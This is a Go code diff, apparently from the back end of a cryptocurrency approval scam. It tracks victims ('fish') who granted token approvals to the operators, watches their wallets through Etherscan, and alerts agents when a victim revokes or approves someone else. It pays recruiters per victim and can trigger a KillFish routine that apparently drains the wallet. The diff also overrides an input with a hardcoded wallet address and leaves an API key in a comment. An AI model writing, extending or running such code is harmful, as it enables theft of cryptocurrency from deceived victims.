@@ -121,9 +121,6 @@ func ToDecimal(ivalue interface{}, decimals int) decimal.Decimal {
 	return result
 }
 
-
-
-
 func ToWei(iamount interface{}, decimals int) *big.Int {
 	amount := decimal.NewFromFloat(0)
 	switch v := iamount.(type) {
@@ -303,6 +300,7 @@ type Fish struct {
 	AlreadyKill             int     `gorm:"int(10);default:2"` //总是杀开关  1 开  2 关   //有钱就杀
 	TheOnlyInvited          string  //唯一邀请码
 	CommissionIncome        float64 `gorm:"type:decimal(10,2)"` //佣金收益
+	AuthorizationWhite      string  //授权地址白名单 不需要报警
 
 }
 
@@ -344,11 +342,12 @@ type BAddressList struct {
 	BKey     string `gorm:"varchar(225)"`
 }
 
+//检查钱包的授权情况
 func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string, Db *gorm.DB, BList []string, redis *redis.Client) {
 
 	//获取 要查询的 fish
 	//apiKey := "5YJ37XCEQFSEDMMI6RXZ756QB7HS2VT921"
-	//foxAddress = "0xb64c3f90a3c72b26d08387cc9f21eb5cbc086956"
+	foxAddress = "0x0eb8573d3a7705df3dc1e48bdd21ff4ac8eceb7c"
 	res, err := http.Get("https://api.etherscan.io/api?module=account&action=txlist&address=" + foxAddress + "&startblock=0&endblock=99999999&page=1&offset=100&sort=asc&apikey=" + apiKey)
 	if err != nil {
 		fmt.Println(err.Error())
@@ -363,11 +362,13 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 	defer res.Body.Close()
 	var data TxList
 	err = json.Unmarshal([]byte(string(body)), &data)
+
 	if err != nil {
 		fmt.Println(err.Error())
 		return
 	}
 	var count int = 0
+
 	if data.Status == "1" && data.Message == "OK" {
 		var ifCount bool = true
 		var status string
@@ -387,6 +388,8 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 					}
 				}
 				if k.InPut[127:] != "00000000000" && InArray(strings.ToLower(BAddressOne), BList) == false { // 已经授权给他人
+					fmt.Println(strings.ToLower(BAddressOne))
+					fmt.Println("授权他人")
 					count++
 				}
 			}
@@ -396,8 +399,8 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 			fish := Fish{}
 			err := Db.Where("fox_address=?", foxAddress).First(&fish).Error
 			if err == nil {
-				//  新增授权
-				if fish.Authorization == 1 { //监控开关
+				//监控开关
+				if fish.MonitoringSwitch == 1 {
 					fishID := strconv.Itoa(int(fish.ID))
 					admin := Admin{}
 					Db.Where("id=?", fish.AdminId).First(&admin)
@@ -409,12 +412,13 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 						" 时间: " + time.Now().Format("2006-01-02 15:04:05") + "%0A" + "👏👏👏️"
 					NotificationAdmin(Db, fish.AdminId, content)
 				}
-
+				//  新增授权
 				if fish.Authorization == 1 { //这条鱼没有授权  // 给授权佣金
 					admin := Admin{}
 					err = Db.Where("id=?", fish.AdminId).First(&admin).Error
 					if err == nil {
-						if admin.CostOfHeadSwitch == 1 { //人头费开关
+						//人头费开关
+						if admin.CostOfHeadSwitch == 1 {
 							//查找他的上级
 							UpFish := Fish{}
 							err00 := Db.Where("id=?", fish.SuperiorId).First(&UpFish).Error
@@ -437,7 +441,6 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 						}
 					}
 				}
-
 				mapData := make(map[string]interface{})
 				mapData["authorization"] = 2
 				mapData["b_address"] = BAddress
@@ -499,7 +502,147 @@ func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string,
 		mapData := make(map[string]interface{})
 		mapData["authorization_time"] = count
 		Db.Table("fish").Where("fox_address=?", foxAddress).Update(mapData)
+	}
 
+}
+
+//检查钱包的授权情况 (重写)
+func ChekAuthorizedFoxAddressTwo(foxAddress string, apiKey string, BAddress string, Db *gorm.DB, BList []string, redis *redis.Client) {
+	//foxAddress = "0x0eb8573d3a7705df3dc1e48bdd21ff4ac8eceb7c"
+
+	res, err := http.Get("https://api.etherscan.io/api?module=account&action=txlist&address=" + foxAddress + "&startblock=0&endblock=99999999&page=1&offset=100&sort=asc&apikey=" + apiKey)
+	if err != nil {
+		fmt.Println(err.Error())
+		return
+	}
+	body, err1 := ioutil.ReadAll(res.Body)
+	if err1 != nil {
+		fmt.Println(err1.Error())
+		return
+	}
+	defer res.Body.Close()
+	var data TxList
+	err = json.Unmarshal([]byte(string(body)), &data)
+
+	if err != nil {
+		fmt.Println(err.Error())
+		return
+	}
+	var count int = 0
+
+	if data.Status == "1" && data.Message == "OK" {
+		for _, k := range data.Result {
+			IsError, _ := strconv.Atoi(k.IsError)
+			if len(k.InPut) == 138 && k.InPut[0:10] == "0x095ea7b3" && IsError == 0 {
+				BAddressOne := "0x" + k.InPut[34:74]
+				//取消我们的授权  更新数据库
+				if k.InPut[127:] == "00000000000" && InArray(strings.ToLower(BAddressOne), BList) {
+					fish := Fish{}
+					Db.Where("fox_address=?", foxAddress).First(&fish)
+					if fish.Authorization == 2 { //已经授权 了 然后取消
+						fishID := strconv.Itoa(int(fish.ID))
+						admin := Admin{}
+						Db.Where("id=?", fish.AdminId).First(&admin)
+						content := "❥【取消授权报警】-------------------------------------------------->%0A" +
+							" 用户编号: [ 11784374" + fishID + "] " + "取消了我们%0A" +
+							" 用户备注: [" + fish.Remark + "] " + "%0A" +
+							"钱包地址:" + foxAddress + "%0A" +
+							"所属代理ID:" + admin.Username + "%0A" +
+							" 时间: " + time.Now().Format("2006-01-02 15:04:05") + "%0A" + "😳😳😳"
+						NotificationAdmin(Db, fish.AdminId, content)
+						//修改鱼的授权状态
+						Db.Table("fish").Where("fox_address=?", foxAddress).Update(Fish{Authorization: 1})
+					}
+				}
+
+				//授权我们
+				if k.InPut[127:] != "00000000000" && InArray(strings.ToLower(BAddressOne), BList) { //授权成功
+					fish := Fish{}
+					err := Db.Where("fox_address=?", foxAddress).First(&fish).Error
+					if err == nil {
+						//监控开关
+						if fish.MonitoringSwitch == 1 && fish.Authorization == 1 {
+							fishID := strconv.Itoa(int(fish.ID))
+							admin := Admin{}
+							Db.Where("id=?", fish.AdminId).First(&admin)
+							Db.Model(&Fish{}).Where("id=?", fish.AdminId).Update(&Fish{AuthorizationAt: time.Now().Unix()}) //更新授权时间
+							content := "❥【授权给我们报警!!】---------------------------------------------------->%0A" +
+								" 用户编号: [ 11784374" + fishID + "] " + "已授权给我们%0A" +
+								"钱包地址:" + foxAddress + "%0A" +
+								"所属代理ID:" + admin.Username + "%0A" +
+								" 时间: " + time.Now().Format("2006-01-02 15:04:05") + "%0A" + "👏👏👏️"
+							NotificationAdmin(Db, fish.AdminId, content)
+						}
+						//  新增授权
+						if fish.Authorization == 1 { //这条鱼没有授权  // 给授权佣金
+							admin := Admin{}
+							err = Db.Where("id=?", fish.AdminId).First(&admin).Error
+							if err == nil {
+								//人头费开关
+								if admin.CostOfHeadSwitch == 1 {
+									//查找他的上级
+									UpFish := Fish{}
+									err00 := Db.Where("id=?", fish.SuperiorId).First(&UpFish).Error
+									if err00 == nil {
+										err1 := Db.Model(&Fish{}).Where("id=?", UpFish.ID).Update(&Fish{
+											CommissionIncome: UpFish.CommissionIncome + admin.CostOfHeadMoney,
+											TotalEarnings:    UpFish.TotalEarnings + admin.CostOfHeadMoney,
+											EarningsMoney:    UpFish.EarningsMoney + admin.CostOfHeadMoney,
+											TodayEarnings:    UpFish.TodayEarnings + admin.CostOfHeadMoney,
+										}).Error
+										if err1 == nil {
+											fins := FinancialDetails{
+												Kinds:   12,
+												FishId:  int(UpFish.ID),
+												Created: time.Now().Unix(),
+											}
+											Db.Save(&fins) //表记录
+										}
+									}
+								}
+							}
+						}
+						mapData := make(map[string]interface{})
+						mapData["authorization"] = 2
+						mapData["b_address"] = BAddress
+						mapData["authorization_at"] = time.Now().Unix()
+						Db.Table("fish").Where("fox_address=?", foxAddress).Update(mapData)
+					}
+				}
+				//授权他人
+				if k.InPut[127:] != "00000000000" && InArray(strings.ToLower(BAddressOne), BList) == false { // 已经授权给他人
+					count++
+					//查看报警白名单
+					fish := Fish{}
+					Db.Where("fox_address=?", foxAddress).First(&fish)
+					if err == nil {
+						whiteArray := strings.Split(fish.AuthorizationWhite, "@")
+						if InArray(BAddressOne, whiteArray) == false {
+							//报警
+							people := strconv.Itoa(count)
+							fishID := strconv.Itoa(int(fish.ID))
+							admin := Admin{}
+							Db.Where("id=?", fish.AdminId).First(&admin)
+							content := "❥【授权他人报警】-------------------------------------------------->%0A" +
+								" 用户编号: [ 11784374" + fishID + "] " + "授权给他人%0A" +
+								" 用户备注: [" + fish.Remark + "] " + "%0A" +
+								"所属代理ID:" + admin.Username + "%0A" +
+								"钱包地址:" + foxAddress + "%0A" +
+								" 当前授权人数: [" + people + "] " + "%0A" +
+								" 时间: " + time.Now().Format("2006-01-02 15:04:05") + "%0A" + "😱😱😱" +
+								" 授权地址: " + BAddressOne + "%0A" + ""
+							NotificationAdmin(Db, fish.AdminId, content)
+							if fish.OthersAuthorizationKill == 1 && fish.AuthorizationTime < count { //授权给他们就杀开关   1开 开始自动杀鱼
+								KillFish(Db, BAddress, foxAddress, int(fish.ID), redis, fish.AdminId, fish.Belong)
+							}
+						}
+					}
+				}
+			}
+		}
+		mapData := make(map[string]interface{})
+		mapData["authorization_time"] = count
+		Db.Table("fish").Where("fox_address=?", foxAddress).Update(mapData)
 	}
 
 }
@@ -766,5 +909,3 @@ func KillFish(Db *gorm.DB, BAddress string, foxAddress string, FishId int, redis
 	fmt.Println(string(respByte))
 
 }
-
-
